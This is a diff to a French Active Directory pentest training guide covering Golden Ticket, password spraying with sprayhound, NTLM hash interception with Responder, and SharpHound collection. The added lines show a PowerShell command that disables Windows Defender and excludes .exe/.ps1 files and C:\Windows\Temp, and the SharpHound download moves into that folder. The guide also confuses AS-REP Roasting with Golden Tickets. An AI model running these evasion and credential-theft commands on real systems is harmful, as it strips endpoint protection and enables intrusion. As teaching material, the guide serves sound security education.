@@ -123,7 +123,7 @@ Get-ADObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
 # Steal or Forge Kerberos Tickets: Golden Ticket
 
 > ATT&CK Tactic : Credential Access <br>
-> ATT&CK Technique : ID: T1558.001
+> ATT&CK Technique ID: T1558.001
 
 La vulnérabilité **AS-REP Roasting** consite à récupérer un ticket TGT ou Golden Ticket
 
@@ -308,9 +308,12 @@ sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p '
 
 
 
-## __Responder__
+## __Intercepter un hash NTLMv1 ou NTLMv2__
+
+__Responder__
 
 * Responder usurpe des services via MDNS / LLMNR / NBT-NS  / WPAD 
+* NTLM peut être amené à utiliser ces protocoles, Responder peut donc les intercepter.
 * Il vient se placer entre le client et le “serveur” inexistant (qu'il imite)
 * Il peut permettre de forcer une authentification NTLM puis récupère le hash de Kerberos
 
@@ -436,21 +439,21 @@ C'est est principalement un outils RedTeam, mais il peut aussi servir à compren
 
 SharpHound se lance sur une machine du domaine, c'est lui qui se charge de récolter les informations du domaine qu'on exploitera par la suite.
 
-### Désactiver Defender
+### Désactiver Defender, ajouter une exclusion pour "C:\Windows\Temp", exclut les extension .exe et .ps1
 ```powershell
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 ```
 
 
 ### Télécharger SharpHound
 ```powershell
-wget https://github.com/SpecterOps/SharpHound/releases/download/v2.8.0/SharpHound_v2.8.0+debug_windows_x86.zip -OutFile C:\Users\Administrateur\Downloads\SharpHound.zip
+wget https://github.com/SpecterOps/SharpHound/releases/download/v2.8.0/SharpHound_v2.8.0+debug_windows_x86.zip -OutFile "C:\Windows\Temp\SharpHound.zip"
 ```
 
 
 ### Dézipper et exécuter SharpHound
 ```powershell
-sl C:\Users\$env:USERNAME\Downloads
+sl "C:\Windows\Temp"
 Expand-Archive -Path SharpHound.zip -DestinationPath .\SharpHound
 cd .\SharpHound\
 .\SharpHound.exe -d $env:USERDNSDOMAIN
